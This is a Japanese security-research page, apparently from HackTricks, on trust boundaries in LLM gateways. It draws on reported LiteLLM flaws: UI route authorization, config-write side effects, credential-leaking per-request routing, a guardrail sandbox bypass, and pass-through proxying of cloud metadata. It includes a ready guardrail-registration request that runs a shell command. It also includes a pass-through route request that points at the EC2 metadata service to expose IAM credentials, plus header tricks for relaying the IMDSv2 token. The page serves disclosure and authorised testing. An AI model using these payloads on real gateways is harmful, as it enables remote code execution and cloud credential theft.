# LLM Gateway の信頼境界

{{#include ../banners/hacktricks-training.md}}

LLM gateway はモデルのルーティングを処理し、多くの場合 provider の認証情報を保持します。そのため、通常の API caller に設定や provider レベルの権限を継承させてはいけません。LiteLLM バージョン 1.77.7 の gateway 評価では、2つの異なる境界が示されました。管理用設定に対する UI セッションの認可と、推論時に caller が指定するルーティング設定です。報告された問題はバージョン 1.83.9 で修正されました。<sup>[[1]](#references)</sup>

## UI route の分類は認可ではない

評価対象の LiteLLM バージョンでは、UI login key は `litellm-dashboard` team に属していました。認可処理では、ユーザーの role にかかわらず、その team identifier に基づいて key を UI token として分類していました。UI route のチェックでは、allowlist に登録された prefix で始まる route をすべて許可していました。その結果、`/config` のエントリは管理用の `/config/update` handler にも一致しました。この handler は一般的な認証を要求するだけで、`PROXY_ADMIN` を個別に要求していなかったため、権限の低い UI session から設定の書き込みが可能になりました。<sup>[[1]](#references)</sup>

これは proxy/backend 間の path 正規化の不一致とは異なります。認可コードと handler が、*同じ* route に対する権限を異なるものとして扱っています。<sup>[[1]](#references)</sup> gateway をレビューする際は、token の分類、route と method の完全一致、および handler 自身による role チェックを比較してください。<sup>[[1]](#references)</sup> 関連するものの異なる境界については、[web API authorization](../pentesting-web/web-api-pentesting.md)、[401/403 bypasses](../pentesting-web/403-and-401-bypasses.md)、および [proxy prefix exemptions](../pentesting-web/proxy-waf-protections-bypass.md#prefix-exemptions-become-routing-keys) を参照してください。

## 設定の書き込みは設定ストア以外にも影響する

同じ LiteLLM の設定更新機能は、環境変数の値を受け付け、実行中の process に適用していました。ある consumer は `UI_LOGO_PATH` を `FileResponse` に渡すローカル path として扱い、それが logo を指すかどうかを検証していませんでした。別の consumer は SSO を使用しない login 時に `UI_USERNAME` と `UI_PASSWORD` を読み取り、一致した場合に `PROXY_ADMIN` を割り当てていました。このため、設定を書き込む権限は、後続の consumer に応じてローカルファイルの漏えいにも管理者 identity の変更にもつながる可能性がありました。response の media type を指定しても、配信されるファイルが画像であることの証明にはなりません。<sup>[[1]](#references)</sup>

pass-through endpoint の設定も、別の後続処理先でした。初期化処理はリモートの S3/GCS adapter target を受け付け、Python module をダウンロードして、`importlib` の `exec_module` を使って import していました。import は adapter instance が使われる前にトップレベルのコードを実行します。adapter の呼び出しだけを制限しても、この実行境界はなくなりません。これは model file の deserialization ではなく、設定によって制御されるコード読み込みとして扱ってください。<sup>[[1]](#references)</sup> 別個のファイル読み取り primitive については、[file inclusion and path traversal](../pentesting-web/file-inclusion/) を参照してください。

## リクエストごとの model routing により gateway の認証情報が leak する可能性がある

LiteLLM の client-side credential 機能は、LLM request 内の `user_config` object を受け付けていました。評価対象の route は、この object から model list と provider の `api_base` を含む一時的な `litellm.Router` を作成していました。caller が制御する provider の送信先は、gateway からの outbound completion request と、設定済みの provider 認証ヘッダーを受け取る可能性がありました。トップレベルの `api_base` または `api_key` field に対する制限は、この別個のネストされた設定経路を対象としていませんでした。これは prompt injection の問題ではなく、認証情報を伴う SSRF 境界です。<sup>[[1]](#references)</sup>

認可された gateway 評価では、per-request configuration を含め、router または provider client を構築できるすべての経路について、通常の設定済み route で使用される送信先と認証情報の policy を照合してください。<sup>[[1]](#references)</sup> [SSRF guide](../pentesting-web/ssrf-server-side-request-forgery/) では、一般的なサーバー側の送信先制御を説明しています。gateway 固有の問題は、信頼度の低い request object に送信先を選ばせながら、権限の高い outbound 認証情報を再利用することです。<sup>[[1]](#references)</sup>

## Guardrail の登録によって UI 専用 sandbox を回避できる

gateway の code-test 経路と code-registration 経路では、検証方法が異なる場合があります。v1.82.0 より前の LiteLLM では、UI の custom-guardrail test は危険な構文を拒否し、`__builtins__ = {}` を指定して実行していました。しかし `POST /guardrails` は、どちらのチェックも行わず、送信された `custom_code` を `exec(compile(...), exec_globals)` でコンパイルしていました。`__builtins__` がない globals dictionary に対しては、Python が builtins を挿入します。そのため、guardrail の登録時に、推論 call が行われる前に module-level import や command が実行されました。その後の `apply_guardrail` callback により、block reason を通じて保存された結果が露出する可能性がありました。<sup>[[2]](#references)[[3]](#references)</sup>

認可されたテストでは、UI sandbox の test に成功したからといって登録も安全だと考えず、test handler と registration handler を比較してください。報告された修正前の request 形式は次のとおりです。<sup>[[2]](#references)</sup>

```http
POST /guardrails HTTP/1.1
Authorization: Bearer <master_key>
Content-Type: application/json

{
  "guardrail": {
    "guardrail_name": "probe",
    "litellm_params": {
      "guardrail": "custom_code", "mode": "pre_call", "default_on": true,
      "custom_code": "import os\nresult = os.popen('id').read()\ndef apply_guardrail(inputs, request_data, input_type):\n    return {'action': 'block', 'reason': result}"
    }
  }
}
```

登録エンドポイントには `PROXY_ADMIN` チェックがなかったため、通常の API key も受け付けていました。master key または JWT/OAuth2 認証が設定されていない場合、修正前の auth handler は匿名リクエストにも `PROXY_ADMIN` を割り当てていました。修正では、認証なしの場合のロールを `INTERNAL_USER` に変更し、管理者チェックの guardrail を追加し、登録時に builtins を検証して制限しました。これらのロールとコード実行の境界は、[MCP token-fallback issue](AI-MCP-Servers.md#mcp-token-passthrough-must-not-create-an-anonymous-session) とは別の問題です。<sup>[[2]](#references)[[3]](#references)</sup>

## 管理者向け pass-through route は cloud metadata を proxy できる

LiteLLM の pass-through endpoint 機能では、管理者が HTTP target を設定し、任意でサブパスを追加できます。上記の per-request `user_config` routing の問題とは異なり、これには**設定を書き込む権限**が必要です。この機能は、管理者を信頼することを前提としています。報告された deployment では、target が private address または link-local address に該当するか確認されていませんでした。<sup>[[2]](#references)[[4]](#references)</sup> v1.83.0 より前は、`/config/update` に管理者ロールのチェックがなかったため、通常の認証済み key でもアクセスできました。関連する設定書き込みの境界については、[UI route classification](#ui-route-classification-is-not-authorization) を参照してください。<sup>[[2]](#references)[[6]](#references)</sup>

この権限があり、proxy から EC2 metadata へのネットワーク到達性もある場合、次のような route によって gateway 経由で metadata を公開できます。`include_subpath` flag により、`/meta/meta-data/iam/security-credentials/` は `/latest/` 配下にマッピングされます。<sup>[[2]](#references)[[4]](#references)</sup>

```http
POST /config/pass_through_endpoint HTTP/1.1
Authorization: Bearer <master_key>
Content-Type: application/json

{"path":"/meta","target":"http://169.254.169.254/latest/","headers":{},"include_subpath":true}
```

[Cloud SSRF guide](../pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md#aws)ではIMDSv2のtoken交換について説明しています。このルートでは`PUT`リクエストを許可し、両方のmetadata headerを中継する必要があります。<sup>[[5]](#references)</sup> LiteLLMの汎用pass-through header処理は転送前に`x-pass-` prefixを取り除くため、`x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600`と`x-pass-X-aws-ec2-metadata-token: <token>`を使ってこれらのheaderを指定できます。<sup>[[2]](#references)[[7]](#references)</sup> proxyがIMDSに到達できること、token responseが設定されたhop limitを通過すること、token requestに`X-Forwarded-For`が含まれないことが必要です。<sup>[[5]](#references)</sup> このgateway固有の変化は、**adminが制御する永続的なrouteとrequest-header relay**です。

## References

- [1] [Check Point Research — LLM Gatewayの誤動作：LiteLLMの調査結果](https://research.checkpoint.com/2026/when-llm-gateways-go-wrong-findings-from-litellm/)
- [2] [Wiz — 油断禁物：認証バイパスからクラウド侵害まで、LiteLLMを突破する](https://wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise)
- [3] [LiteLLM PR #22095 — custom code guardrailにおける未認証RCEとsandbox escapeを修正](https://github.com/BerriAI/litellm/pull/22095)
- [4] [LiteLLM — Pass Through Endpointの作成](https://docs.litellm.ai/docs/proxy/pass_through)
- [5] [AWS — Instance Metadata Service Version 2の仕組み](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html)
- [6] [LiteLLM advisory — 制限のないproxy設定endpoint](https://github.com/advisories/GHSA-53mr-6c8q-9789)
- [7] [LiteLLM pass-through header転送の実装](https://github.com/BerriAI/litellm/blob/v1.84.0/litellm/passthrough/utils.py)
{{#include ../banners/hacktricks-training.md}}
